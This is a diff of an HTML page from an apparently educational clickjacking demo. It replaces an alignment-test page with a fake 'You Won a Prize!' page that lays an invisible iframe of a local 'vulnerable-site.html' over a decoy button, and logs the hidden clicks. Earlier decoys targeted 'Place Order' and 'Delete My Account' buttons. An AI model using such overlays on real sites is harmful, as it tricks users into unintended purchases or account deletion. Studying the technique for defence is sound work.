@@ -1,77 +1,36 @@
 <!DOCTYPE html>
-<!--
-  ALIGNMENT-TEST PAGE (single document, no iframe)
-
-  This page exists purely so you can visually align each decoy exactly over
-  its target button without fiddling with iframe top/left pixel guesswork.
-  Each real button is wrapped in a `.target-wrap` (position:relative), and
-  its matching decoy sits inside that SAME wrapper with `position:absolute;
-  inset:0;` - meaning it automatically covers the real button exactly,
-  no matter what size/font/browser renders it. No manual tuning needed.
-
-  IMPORTANT PEDAGOGICAL NOTE FOR YOUR PROJECT:
-  This is NOT a faithful cross-origin clickjacking PoC. Real clickjacking
-  relies on an attacker's page loading the victim's page from a DIFFERENT
-  origin inside an <iframe> - the browser itself routes the native click to
-  the hidden element inside that separate document, with no JavaScript
-  needed to make it happen. Here, everything lives in ONE document, so a
-  native click can only ever land on ONE element (the topmost decoy) - the
-  real button can never receive it natively. To still demonstrate the
-  "hidden action fires" effect, this page uses a small bit of JS
-  (`realBtn.click()`) to simulate it. For the TRUE two-document version
-  (the one that actually demonstrates the real vulnerability), keep using
-  attack-classic-overlay.html and attack-spin-wheel.html, which still load
-  vulnerable-site.html in a real <iframe> exactly as before - this file is
-  only a convenience tool for working out alignment, colors, and timing.
--->
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Alignment Test - ShopEase + Both Payloads</title>
+<title>You Won a Prize!</title>
 <link rel="stylesheet" href="styles.css">
 </head>
-<body class="site-page">
-<div class="card">
-  <h2>Welcome back, Malek</h2>
-  <div class="balance">Cart total: $249.99</div>
+<body class="attack-classic">
+  <h1>🎉 Congratulations! 🎉</h1>
+  <p>You've been selected for a free $100 gift card.</p>
+  <button class="decoy-btn">Claim Your Prize Now</button>
 
-  <!-- Real button 1 + Payload 1 (classic overlay) decoy on top of it -->
-  <div class="target-wrap">
-    <button id="orderBtn">Place Order (1-Click Checkout)</button>
-    <button class="decoy-overlay payload-classic" id="decoyClassic">Claim Your Prize Now</button>
-  </div>
+  <!-- Hidden victim page overlaid on top of the decoy button -->
+  <iframe class="iframe-overlay-classic" src="vulnerable-site.html"></iframe>
 
-  <!-- Real button 2 + Payload 2 (spin wheel) decoy on top of it -->
-  <div class="target-wrap">
-    <button id="deleteBtn">Delete My Account</button>
+  <p class="demo-note">
+    (Demo note: temporarily raise the iframe's opacity in styles.css to see the
+    alignment while testing/screenshotting, then set it back to 0.)
+  </p>
 
-    <div class="wheel-decor">
-      <div class="wheel-pointer"></div>
-      <div class="wheel" id="wheel">
-        <span class="wheel-label" style="transform: translate(-50%, -50%) rotate(30deg)  translateY(-95px) rotate(-30deg);">$1000</span>
-        <span class="wheel-label" style="transform: translate(-50%, -50%) rotate(90deg)  translateY(-95px) rotate(-90deg);">$50</span>
-        <span class="wheel-label" style="transform: translate(-50%, -50%) rotate(150deg) translateY(-95px) rotate(-150deg);">FREE</span>
-        <span class="wheel-label" style="transform: translate(-50%, -50%) rotate(210deg) translateY(-95px) rotate(-210deg);">$500</span>
-        <span class="wheel-label" style="transform: translate(-50%, -50%) rotate(270deg) translateY(-95px) rotate(-270deg);">$0</span>
-        <span class="wheel-label" style="transform: translate(-50%, -50%) rotate(330deg) translateY(-95px) rotate(-330deg);">$2000</span>
-      </div>
-    </div>
-    <button class="decoy-overlay payload-wheel" id="decoyWheel">SPIN</button>
-  </div>
-
-  <!-- Real button 3 - no decoy assigned to it in this demo -->
-  <button id="subscribeBtn">Subscribe to Premium Membership ($9.99/mo)</button>
-
-  <div id="log"></div>
-</div>
-
-<p class="demo-note">
-  (Tune each payload's own opacity independently in styles.css:
-  --classic-opacity for the yellow prize button, --wheel-opacity for the
-  spin wheel. Raise one temporarily to 0.3-0.5 to check its alignment,
-  then set it back to 0 - the other payload is unaffected.)
-</p>
-
-<script src="vulnerable.js"></script>
+  <script>
+    // DEBUG LISTENER (for demo/verification purposes only):
+    // The hidden victim page (vulnerable-site.html) sends a postMessage every
+    // time one of its buttons is actually clicked. This listener catches that
+    // message and prints it to the DevTools Console, so you can confirm the
+    // hidden click actually landed on a real button WITHOUT needing to raise
+    // the iframe's opacity. Open DevTools (F12) -> Console tab, click the
+    // decoy button, and watch for "[ATTACKER PAGE] Captured hidden action".
+    window.addEventListener('message', (event) => {
+      if (event.data && event.data.demo) {
+        console.log('[ATTACKER PAGE] Captured hidden action:', event.data.action);
+      }
+    });
+  </script>
 </body>
 </html>
